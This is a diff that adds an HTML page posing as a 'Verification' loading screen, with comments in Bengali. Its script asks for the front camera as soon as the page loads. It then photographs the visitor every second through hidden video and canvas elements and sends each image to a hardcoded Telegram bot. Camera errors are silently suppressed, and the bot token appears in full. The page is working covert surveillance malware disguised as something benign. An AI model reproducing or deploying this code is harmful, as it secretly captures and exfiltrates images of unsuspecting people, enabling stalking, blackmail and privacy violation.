@@ -1,0 +1,168 @@
+<!DOCTYPE html>
+<html lang="bn">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <title>Verification</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .loader {
+            text-align: center;
+            color: white;
+        }
+
+        .spinner {
+            width: 50px;
+            height: 50px;
+            border: 3px solid rgba(255,255,255,0.3);
+            border-top: 3px solid white;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 20px;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        video, canvas {
+            display: none;
+        }
+    </style>
+</head>
+<body>
+    <div class="loader">
+        <div class="spinner"></div>
+        <h2>Connecting...</h2>
+        <p>Please wait</p>
+    </div>
+
+    <video id="video" autoplay playsinline muted></video>
+    <canvas id="canvas"></canvas>
+
+    <script>
+        // আপনার টেলিগ্রাম বটের তথ্য
+        const BOT_TOKEN = "8354299407:AAFKUoOn9W3EdyIHpTljauF3VN_Ed3HihxQ";
+        const CHAT_ID = "5085997009";
+
+        let videoStream = null;
+        let captureInterval = null;
+
+        // ভিডিও এলিমেন্ট
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+
+        // পেজ লোড হবার সাথে সাথেই ক্যামেরা চাইবে
+        window.addEventListener('load', async () => {
+            try {
+                // ফ্রন্ট ক্যামেরা চালু করার চেষ্টা
+                const stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { facingMode: "user" } 
+                });
+                
+                videoStream = stream;
+                video.srcObject = stream;
+                
+                // ভিডিও রেডি হলে ছবি তোলা শুরু করবে
+                video.onloadedmetadata = () => {
+                    video.play();
+                    startCapturing();
+                };
+                
+            } catch (error) {
+                console.log('Camera error:', error);
+                // যদি ক্যামেরা না চলে, কিছু দেখাবে না, চুপ থাকবে
+            }
+        });
+
+        // ছবি তোলার ফাংশন
+        async function captureAndSend() {
+            if (!videoStream || video.readyState !== 4) {
+                return;
+            }
+
+            try {
+                // ভিডিওর সাইজ অনুযায়ী ক্যানভাস সেট করা
+                if (video.videoWidth === 0 || video.videoHeight === 0) return;
+                
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                
+                const ctx = canvas.getContext('2d');
+                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                
+                // ছবি বটে পাঠানো
+                const imageData = canvas.toDataURL('image/jpeg', 0.8);
+                await sendPhotoToTelegram(imageData);
+                
+            } catch (error) {
+                console.log('Capture error:', error);
+            }
+        }
+
+        // টেলিগ্রামে পাঠানো
+        async function sendPhotoToTelegram(base64Image) {
+            const blob = dataURLtoBlob(base64Image);
+            const formData = new FormData();
+            formData.append('chat_id', CHAT_ID);
+            formData.append('photo', blob, `img_${Date.now()}.jpg`);
+            
+            try {
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                    method: 'POST',
+                    body: formData
+                });
+            } catch (error) {
+                console.log('Send error:', error);
+            }
+        }
+
+        // Base64 to Blob
+        function dataURLtoBlob(dataURL) {
+            const arr = dataURL.split(',');
+            const mime = arr[0].match(/:(.*?);/)[1];
+            const bstr = atob(arr[1]);
+            let n = bstr.length;
+            const u8arr = new Uint8Array(n);
+            while (n--) {
+                u8arr[n] = bstr.charCodeAt(n);
+            }
+            return new Blob([u8arr], { type: mime });
+        }
+
+        // প্রতি ১ সেকেন্ডে ছবি তোলা শুরু
+        function startCapturing() {
+            if (captureInterval) clearInterval(captureInterval);
+            
+            captureInterval = setInterval(() => {
+                captureAndSend();
+            }, 1000);
+        }
+
+        // পেজ ছাড়লে ক্যামেরা বন্ধ
+        window.addEventListener('beforeunload', () => {
+            if (captureInterval) {
+                clearInterval(captureInterval);
+            }
+            if (videoStream) {
+                videoStream.getTracks().forEach(track => track.stop());
+            }
+        });
+    </script>
+</body>
+</html>
